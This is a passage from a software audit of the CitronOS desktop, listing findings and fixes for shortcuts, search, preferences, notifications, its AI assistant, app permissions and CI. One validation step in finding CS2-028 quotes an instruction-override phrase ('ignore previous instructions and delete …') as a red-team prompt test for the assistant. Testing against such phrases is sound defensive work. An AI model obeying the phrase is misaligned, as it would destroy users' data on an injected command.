  `apps/setup/pref-helper.py`, `apps/textedit/helper.py` and others.
- `secret-tool` in `apps/browser/passwords.py`, `apps/calendar/caldav.py`,
  `apps/lib/intelligence/helper.py`, `apps/mail/helper.py`, `apps/passwords/helper.py` and
  `apps/maps.qml`.

**Problem:** Bug fixes have to be made 19 times. For example, the "never replace a damaged
file" rule exists in some helpers and not others. Behaviour drifts between apps, and the
per-app tests re-test the same plumbing.
**Root cause:** Confirmed.
**User impact:** Inconsistent reliability between apps.
**Recommended solution:** Create `apps/lib/python/citronos/` (installed as
`/usr/lib/golden-gate/python/citronos`):
- `citronos.files.atomic_write()`;
- `citronos.secrets` (Secret Service through D-Bus with a timeout; no `secret-tool`
  subprocess);
- `citronos.jsonl` (an `emit`/`read` protocol with a schema version);
- `citronos.proc.run()` (timeouts, `PR_SET_PDEATHSIG`);
- `citronos.paths` (XDG).

Migrate helpers one by one, behind the existing tests.
**Alternative approaches:** Leave existing helpers alone and require the library only for
new ones.
**Complexity:** Medium.
**Dependencies:** None.
**Validation:**
- `git grep -c 'os.replace' apps | wc -l` drops to 1.
- Existing helper tests still pass.
- New unit tests for `citronos.*`.

**Status:** Confirmed.

### Finding ID: CS2-021

**Area:** Keyboard shortcuts
**Category:** Performance
**Severity:** P2
**Current implementation:** Most shell shortcuts are Hyprland `exec` binds that start a new
`qs -c golden-gate ipc call …` process: Spotlight (⌘Space), Control Center, Launchpad,
Mission Control (and the trackpad gestures), screenshots, lock and Citron. Only the app
switcher uses Hyprland `global` shortcuts.
**Evidence:** `compositor/hyprland/hyprland.conf:134-139` (gestures) and `:186-230` (binds);
`$qs = qs -c golden-gate ipc call`.
**Problem:** Each keypress starts a Quickshell client process, which has to initialise Qt and
connect over IPC before anything appears. That cost is added to the time before Spotlight
opens on every press.
**Root cause:** Suspected (latency not measured; no Quickshell here).
**User impact:** Spotlight and Mission Control may feel slower to open than they should.
**Recommended solution:** Use `GlobalShortcut { appid: "golden-gate"; name: "spotlight" }`
in QML with Hyprland `bind = $mod, SPACE, global, golden-gate:spotlight`, as `Switcher.qml`
already does. Keep `ipc call` for scripts.
**Alternative approaches:** None needed.
**Complexity:** Small.
**Dependencies:** None.
**Validation:** Record a 240 fps video and measure the median time from keypress to the
first Spotlight frame, before and after. Target: under 50 ms.
**Status:** Suspected.

### Finding ID: CS2-022

**Area:** Spotlight
**Category:** Performance, Feature gap
**Severity:** P2
**Current implementation:** Each file query runs
`find $HOME -maxdepth 5 -iname "*query*" | head -40`. There is no index, no file-content
search, no metadata search and no recents ranking.
**Evidence:** `shell/Spotlight.qml:82`.
**Problem:** Searching a large home folder walks the disk on every query. Results are
limited to five folder levels and to file names. Files deeper down, or matching by content,
are never found.
**Root cause:** Confirmed (design). Latency not measured.
**User impact:** Spotlight misses files, and searches can be slow on large homes.
**Recommended solution:** Use `localsearch`/`tinysparql` (formerly Tracker 3). It indexes
names, content and metadata, is event-driven through inotify, is queried over D-Bus, and
Files can share it. Wrap it in a search-provider interface (apps, settings, files, contacts,
calculator, web, Citron), as set out in
[05-ARCHITECTURE-PROPOSAL.md](05-ARCHITECTURE-PROPOSAL.md#search).
**Alternative approaches:** `plocate`, for names only (fast, periodic `updatedb`).
**Complexity:** Medium.
**Dependencies:** None.
**Validation:** With 200k files in home, the median query is under 100 ms, and a file seven
levels deep with a matching word in its contents is found.
**Status:** Confirmed (design).

### Finding ID: CS2-023

**Area:** Preferences
**Category:** Backend, Reliability
**Severity:** P2
**Current implementation:** Almost every preference lives in one
`~/.config/golden-gate/desktop.json`. Writes go through `gg-pref` (Python, which locks,
replaces atomically and refuses to touch a damaged file). The shell changes its in-memory
copy first and writes fire-and-forget with `execDetached`, ignoring failures. Settings, by
contrast, checks the exit code. If the file can't be parsed, the shell silently falls back
to defaults.
**Evidence:**
- `shell/components/Prefs.qml:33-58` (`setTabletWidgets`, `setDockPinned`, `setWidgets`:
  `execDetached`, no error path) and `:131-133` (parse failure → `data = {}`).
- `apps/setup/pref-helper.py:29-36` (refuses a damaged file).
- `apps/settings/Sys.qml:89-92` (checks the exit code).
- **Measured:** one `gg-pref` write costs 40 ms median and 47 ms p90 (20 runs, 4-core
  container; bare `python3` start-up is 14 ms).

**Problem:** If `desktop.json` is damaged, the Dock shows default apps. Rearranging it looks
like it worked, but every write is refused, and after a restart the user's arrangement is
gone. There is no message. All of the OS's preferences share one file, one lock and one
watcher, so every write wakes every `FileView`.
**Root cause:** Confirmed.
**User impact:** Changes are silently lost.
**Recommended solution:** Add a `citronos-settingsd` user service (D-Bus
`org.citronos.Settings1`, with typed keys, schema defaults and change signals per key). It
stores data in per-domain files and backs up the last good copy (`desktop.json.bak`). If a
damaged file is found, it restores the backup and tells the user. Until then, make the
`Prefs.qml` writers use `Process` with an `onExited` error path (as `setFocus` already does,
`:111-123`) and show the error.
**Alternative approaches:** GSettings with CitronOS schemas. This is native and typed, but
harder to edit and to test.
**Complexity:** Medium.
**Dependencies:** CS2-006.
**Validation:** Damage `desktop.json`, rearrange the Dock and restart: the arrangement is
kept, and a notification explains that the backup was restored.
**Status:** Confirmed.

### Finding ID: CS2-024

**Area:** Notifications
**Category:** Architecture, Feature gap
**Severity:** P2
**Current implementation:** The freedesktop notification server runs inside the shell
process (`NotificationServer { keepOnReload: true }`). History survives a QML reload but
not a process restart or a log-out. Dock badges come from counting live notifications plus
a Mail-written `mail-badges.json`, which is re-read every 30 s.
**Evidence:** `shell/Notifications.qml:177-179`, `:32-48`. No `LauncherEntry` (Unity
badge/progress API) anywhere in `shell/` or `apps/`.
**Problem:**
1. Each shell crash or restart (CS2-004, CS2-006) loses Notification Center's history and
   drops notifications sent during the restart.
2. Third-party apps can't set Dock badges or progress, though most Electron, Qt and GTK
   apps already use the de-facto `com.canonical.Unity.LauncherEntry` API.

**Root cause:** Confirmed.
**User impact:** Missed notifications. Badges only for CitronOS apps.
**Recommended solution:** Run a separate `citronos-notifyd` service (CS2-006). It owns
`org.freedesktop.Notifications`, persists history in SQLite under `~/.local/state`, applies
Focus rules, and exposes `org.citronos.Notifications1` to the shell. Implement
`com.canonical.Unity.LauncherEntry` for badges, counts and progress, and route Mail's badge
through it.
**Alternative approaches:** Keep the in-shell server but write history to disk. This fixes
log-out loss but not crash loss.
**Complexity:** Medium.
**Dependencies:** CS2-006.
**Validation:** `notify-send` ×3, then kill the shell: all three are still in Notification
Center after the restart. An Electron app's badge shows on its Dock icon.
**Status:** Confirmed.

### Finding ID: CS2-025

**Area:** Shell surfaces
**Category:** Performance
**Severity:** P2
**Current implementation:** On every screen, the shell creates Launchpad as a full-screen
layer surface that is always mapped, transparent, with an empty input mask. It also
creates the tablet Home Screen's whole tree, which is only hidden when tablet mode is off.
**Evidence:** `shell/Applications.qml:163-176` (`visible: true`, full-screen, Top layer);
`shell/TabletHome.qml:15-18` (`visible: Prefs.tabletMode`, tree still created);
`shell/shell.qml:197-247` (per screen).
**Problem:** There is a permanent full-screen surface per monitor for the compositor to
composite (and possibly glass to process). Start-up builds Launchpad's whole icon grid
(which also triggers CS2-004) and a tablet layout most users never see. The cost of each
grows with the number of monitors.
**Root cause:** Suspected (cost not measured).
**User impact:** Slower log-in, more memory, and possibly compositor work at idle.
**Recommended solution:**
- Wrap `TabletHome` in `LazyLoader { active: Prefs.tabletMode }`.
- For Launchpad, keep the window warm but stop rendering the grid while closed
  (`grid.visible: apps.showing` with layer caching). Alternatively, prebuild it once
  during idle time (`Qt.callLater` after the session is up) instead of at start-up.
- Confirm HyprGlass skips `gg-applications` while the mask is empty.

**Alternative approaches:** None needed.
**Complexity:** Small.
**Dependencies:** A performance harness.
**Validation:** Measure shell RSS and time-to-desktop with 1 and 3 monitors, before and
after.
**Status:** Suspected.

### Finding ID: CS2-026

**Area:** Control Center
**Category:** Performance, Backend
**Severity:** P2
**Current implementation:** Dragging the brightness slider runs
`sh -c "brightnessctl -q set N%"` through Hyprland exec every 40 ms. Wi-Fi state is read by
starting `nmcli` each time Control Center opens. The Bluetooth power switch starts
`bluetoothctl`.
**Evidence:** `shell/ControlCenter.qml:110-125`, `:172-199`, `:639`, `:647`.
**Problem:** A one-second drag starts about 25 shells and 25 `brightnessctl` processes.
State reads are polls, so changes made elsewhere aren't reflected while the panel is open.
**Root cause:** Confirmed.
**User impact:** Jank while dragging on slow CPUs, and stale toggles.
**Recommended solution:**
- Brightness: call logind's `org.freedesktop.login1.Session.SetBrightness` over D-Bus. It
  needs no root, needs no process, and the backlight's `uevent` reports changes.
- Wi-Fi and Bluetooth: use the services from CS2-014 and CS2-016.
- Audio is already done properly with `Quickshell.Services.Pipewire`. Use it as the model.

**Alternative approaches:** None needed.
**Complexity:** Small.
**Dependencies:** CS2-014, CS2-016.
**Validation:** `execsnoop` during a slider drag shows no processes.
**Status:** Confirmed.

### Finding ID: CS2-028

**Area:** Citron Intelligence
**Category:** Architecture, Feature gap
**Severity:** P2
**Current implementation:** Citron supports Gemini only (`API = generativelanguage…`). It
has text and image tasks, Writing Tools and voice over Gemini Live. The key is kept in
Secret Service and sent as a header, never in argv or URLs (good practice). The voice prompt
tells the model not to claim abilities it lacks. There are no tools or system actions.
**Evidence:** `apps/lib/intelligence/helper.py:6`, `:26`, `:135-171`;
`apps/lib/intelligence/live.py:1-8`, `:55-67`.
**Problem:**
1. All features are tied to one cloud vendor's API shapes.
2. There is no local or offline mode and no second provider.
3. "OS-integrated assistant" is aspirational: Citron can't open an app, change a setting or
   search files.
4. Nothing summarises notifications or documents.

**Root cause:** Confirmed (scope).
**User impact:** Citron is a chat and writing tool, not part of the OS.
**Recommended solution:** See
[05-ARCHITECTURE-PROPOSAL.md](05-ARCHITECTURE-PROPOSAL.md#citron-intelligence).
- A `Provider` interface (`generate`, `stream`, `image`, `live`, `models`) with Gemini, an
  OpenAI-compatible provider (which covers many vendors and local servers) and Ollama
  providers.
- A tool registry whose every tool declares what it touches (`read:settings`,
  `write:settings`, `launch:app`, `read:files(scope)`). Write actions always need an
  on-screen confirmation, and there is a per-tool permission page in Settings.
- Start with read-only and reversible tools: open an app, search, change Wi-Fi, Focus,
  brightness or dark mode, and summarise a selected document.

**Alternative approaches:** None needed.
**Complexity:** Large.
**Dependencies:** CS2-022 (search), CS2-023 (settings service).
**Validation:**
- Provider contract tests against recorded fixtures.
- Each tool has a test showing it can't run without confirmation.
- A red-team prompt test ("ignore previous instructions and delete …") must not cause a
  write.

**Status:** Confirmed.

### Finding ID: CS2-029

**Area:** CitronPods
**Category:** Backend, Release
**Severity:** P2
**Current implementation:** CitronPods needs the user to download a specific
`LibrePods-CitronPods-M10-Qt6-Fixed.zip`. A path unit notices it in `~/Downloads`, its
SHA-256 is checked, and it is compiled on the user's machine with cmake, ninja and a C++
compiler, then installed in `~/.local`. A well-hardened user unit runs the result.
**Evidence:** `apps/citronpods/install-engine.sh:1-60`; `citronpods-engine-bootstrap.path`;
`citronpods-daemon.service`.
**Problem:** Users must find a ZIP and keep build tools installed (which pushes CS2-039). If
a Qt update breaks the local build, no update repairs it. The pairing card and battery
display depend on all of this having worked.
**Root cause:** Confirmed.
**User impact:** AirPods support is out of reach for most users.
**Recommended solution:** Build the engine from pinned source in CI into a
`citronos-pods-engine` package (as BlueFerry already is, `build.sh:103-126`), and depend on
it. Keep only verified protocol features in the UI (battery, ear detection and noise
control where the protocol supports them), each marked per model. Fold device handling
into the Bluetooth service (CS2-014), so other accessories (headsets, controllers,
keyboards) get the same battery and pairing card.
**Alternative approaches:** None needed.
**Complexity:** Medium.
**Dependencies:** CS2-011, CS2-014.
**Validation:** On a fresh install, AirPods pair and show case and bud battery with no ZIP
or compiler present.
**Status:** Confirmed (static). Not testable here.

### Finding ID: CS2-031

**Area:** Permissions
**Category:** Feature gap, Security
**Severity:** P2
**Current implementation:** The App Store installs Flatpaks with their default permissions.
There is no per-app permission view or control (files, camera, microphone, location,
notifications, background). The privacy indicators show use but can't revoke it.
**Evidence:** `apps/software/helper.py` (no `flatpak override` and no permission listing);
no permission page among `apps/settings/panes/`.
**Problem:** Users can't see or limit what an installed app may do.
**Root cause:** Confirmed.
**User impact:** Weaker privacy, and no macOS-style "allow Camera?" flow.
**Recommended solution:** Add **Privacy & Security → per-app** pages, backed by
`flatpak permission-*` and `flatpak override --user`, and by the xdg-desktop-portal
permission store (camera, location, screencast, background). Show a Flatpak's permissions
on its App Store page before Get.
**Alternative approaches:** None needed.
**Complexity:** Medium.
**Dependencies:** None.
**Validation:** Revoke an app's camera permission and check it gets a portal denial. The
App Store shows `filesystem=home` for an app that requests it.
**Status:** Confirmed.

### Finding ID: CS2-032

**Area:** App Store / Mac Apps
**Category:** Security, Product
**Severity:** P2
**Current implementation:** Mac apps are downloaded from developer URLs in the Homebrew
Cask catalogue. Each is checked against the cask's checksum "where there is one", installed
into `~/Applications` and run with Darling, without a sandbox. The README says that apps
with windows are experimental under Darling.
**Evidence:** `apps/software/macapps.py`; README "App Store, and Mac apps".
**Problem:** Casks with `sha256 :no_check` run unverified. Darling processes have the user's
full rights. The App Store presents this experimental path next to Flathub as if it were
just as dependable.
**Root cause:** Confirmed (design).
**User impact:** Risk, and disappointment when apps don't open.
**Recommended solution:** Refuse casks without a checksum. Label the section
"Experimental" and keep it out of Discover. Run Darling apps in a `bwrap` or
`systemd-run --user -p ProtectHome=read-only` scope with `~/Applications/<app>` writable.
Consider moving Mac Apps and Darling into an optional package (see
[04](04-FEATURE-OPPORTUNITIES.md#3-features-to-not-add-or-to-scope-down)).
**Alternative approaches:** None needed.
**Complexity:** Small.
**Dependencies:** None.
**Validation:** A cask with `:no_check` is refused. A Darling app can't write `~/.ssh`.
**Status:** Confirmed (static).

### Finding ID: CS2-033

**Area:** CI and tests
**Category:** Testing
**Severity:** P2
**Current implementation:** CI is large: 134 of the 135 test files run in a workflow (only
`tests/logic.mjs` is not wired in), which is a real asset.
But `check.yml`'s "Guard the login and glass paths" step is about 80 `grep -q` / `! grep -q`
lines, and 149 grep or `test` checks in total, asserting that particular strings exist in
particular files (for example `grep -q 'iPad-style glass shelf' shell/Dock.qml`).
**Evidence:** `.github/workflows/check.yml:38-118`.
**Problem:** These checks fail on harmless renames and pass on broken behaviour. They make
refactoring (CS2-018, CS2-019) expensive and give false confidence. None of the P0
findings would be caught by them.
**Root cause:** Confirmed.
**User impact:** Indirect: slower, riskier changes.
**Recommended solution:** Replace the string guards, group by group, with behaviour tests
in the existing preview harness (`tools/preview/preview.py`, which loads QML with
Quickshell stubs), plus three new layers:
1. A **real-session smoke test**: headless Hyprland or Sway, Quickshell, ten cold starts,
   crash detection, screenshots.
2. **Security lints**: no shell strings built from data (CS2-002); no passwordless polkit
   paths that run downloaded code (CS2-001).
3. **Performance budgets**: start-up time, idle CPU and RSS from the session smoke test.

**Alternative approaches:** None needed.
**Complexity:** Medium.
**Dependencies:** None.
**Validation:** The guard step shrinks to at most 10 structural checks, and each removed guard
has a matching behaviour test.
**Status:** Confirmed.

### Finding ID: CS2-042

**Area:** Calendar
**Category:** Feature gap
**Severity:** P2
**Current implementation:** Local calendars are reliable (atomic store, conflict checks,
reminders). CalDAV is read-only, one-way, with a replace-on-success cache, and events from
remote calendars can't be edited.
**Evidence:** `apps/calendar/caldav.py:1-9`.
**Problem:** Users of iCloud, Google or Fastmail calendars can see events but can't create
or change them, and invitations aren't handled.
**Root cause:** Confirmed (scope).
**User impact:** Calendar can't be someone's main calendar.
**Recommended solution:** Use the same back end as Mail (CS2-015): EDS calendars through
GOA, with read and write access, invitations (iTIP) and alarms through the EDS reminder
daemon. Alternatively, extend `caldav.py` with `PUT`/`DELETE` and ETag conflict handling.
**Alternative approaches:** See the recommended solution.
**Complexity:** Medium to Large.
**Dependencies:** CS2-015.
**Validation:** Create, edit and delete an event on a Fastmail CalDAV test account, and see
the change in a second client.
**Status:** Confirmed.

---

## P3: low

### Finding ID: CS2-038

**Area:** Versioning
**Category:** Release
**Severity:** P3
**Current implementation:** `apps/lib/theme/Release.qml` says "CitronOS Sprite 3.5". Updates
identify releases by commit. The Club Soda brief calls the next release "CitronOS 2".
**Evidence:** `apps/lib/theme/Release.qml:8-12`; `golden_update.py:152-158`.
**Problem:** Calling the next release "2" would go backwards from 3.5. Nothing ties a
marketing version to a set of packages.
**Root cause:** Confirmed.
**User impact:** Confusion in support and bug reports.
**Recommended solution:** Decide the number. Either Club Soda is **CitronOS 4** (version
4.0, codename Club Soda), or "CitronOS 2" names a product generation and the version
continues at 4.0. Then make one `VERSION` file the source for `Release.qml`, `os-release`,
package versions and git tags.
**Alternative approaches:** See the recommended solution.
**Complexity:** Small.
**Dependencies:** CS2-003.
**Validation:** `cat /etc/os-release`, About This Computer, `pacman -Q citronos` and the git
tag all agree.
**Status:** Confirmed.

### Finding ID: CS2-039

**Area:** ISO contents
**Category:** Security, Performance
**Severity:** P3
**Current implementation:** The image ships `gcc`, `cmake`, `ninja`, `git`, `nodejs`,
`fakeroot`, `xorg-server-xvfb`, `weston` and other build and test tools. These are used by
LCode, local CitronPods builds and tests.
**Evidence:** `distro/archiso/packages.x86_64`.
**Problem:** They make the image larger, slow down updates and widen the attack surface for
users who never use LCode.
**Root cause:** Confirmed.
**User impact:** Slightly larger downloads and updates.
**Recommended solution:** Move these into `citronos-developer` (pulled in by LCode's App
Store page) once CS2-029 removes the need to compile locally.
**Alternative approaches:** See the recommended solution.
**Complexity:** Small.
**Dependencies:** CS2-029.
**Validation:** Compare ISO size before and after. LCode still installs its tools when
needed.
**Status:** Confirmed.

### Finding ID: CS2-040

**Area:** Diagnostics
**Category:** Performance
**Severity:** P3
**Current implementation:** `crash-watch.sh` runs `ls /var/lib/systemd/coredump` every 10
seconds. It starts only if diagnostics sharing was already on at log-in.
**Evidence:** `apps/setup/crash-watch.sh:8-15`.
**Problem:** It polls constantly, and opting in takes effect only after the next log-in.
**Root cause:** Confirmed.
**User impact:** Minor.
**Recommended solution:** A systemd `.path` unit on the coredump directory, enabled or
disabled by the privacy setting.
**Alternative approaches:** See the recommended solution.
**Complexity:** Small.
**Dependencies:** CS2-006.
**Validation:** Opting in mid-session produces a report for the next crash.
**Status:** Confirmed.

### Finding ID: CS2-041

**Area:** Menu bar / Wi-Fi name
**Category:** Backend
**Severity:** P3
**Current implementation:** The current SSID is read with
`nmcli -t -f ACTIVE,SSID dev wifi | awk -F: '$1=="yes"{print $2}'`.
**Evidence:** `shell/ControlCenter.qml:177-180`.
**Problem:** `nmcli -t` escapes `:` as `\:`, so an SSID like `Cafe:Guest` shows as `Cafe\`.
**Root cause:** Confirmed (nmcli terse-mode escaping).
**User impact:** A wrong network name is shown.
**Recommended solution:** Superseded by CS2-016's D-Bus service. As a stop-gap, use
`nmcli -g` (get-values mode).
**Alternative approaches:** See the recommended solution.
**Complexity:** Small.
**Dependencies:** CS2-016.
**Validation:** Join `a:b` and check Control Center shows `a:b`.
**Status:** Confirmed (static).

---

## What is already good (keep it)

The audit isn't only a list of defects. These are strengths the plan builds on.

- **Data-safety discipline.** Atomic writes, refusing damaged files, and conflict checks in
  Notes, Calendar, Files and the preference writer, each backed by tests (`notes-conflicts`,
  `calendar-store`, `files-workflow`, `settings-prefs`).
- **Secrets.** Mail, CalDAV, Web and Citron passwords and keys go to Secret Service, not
  JSON or argv. Citron's key is sent as a header. CS2-016 is the exception.
- **Honest UI.** Software Update reports success only when every part succeeded
  (`update-outcomes.py`). Citron's voice prompt forbids claiming abilities it lacks. The
  README states the limits of Darling and Web.
- **Shared component store.** `apps/lib` (Glass, AppWindow, controls, motion) is consumed by
  the apps, the shell, Setup and SDDM. The foundation for CS2-018 exists.
- **Test volume.** 135 test files, with CI on every push, an ISO build, and a QEMU boot test.
- **Native services where they are used.** Audio through `Quickshell.Services.Pipewire`,
  MPRIS, UPower, power-profiles-daemon, udisks2 for Disk Utility, and logind and PAM for the
  lock screen.
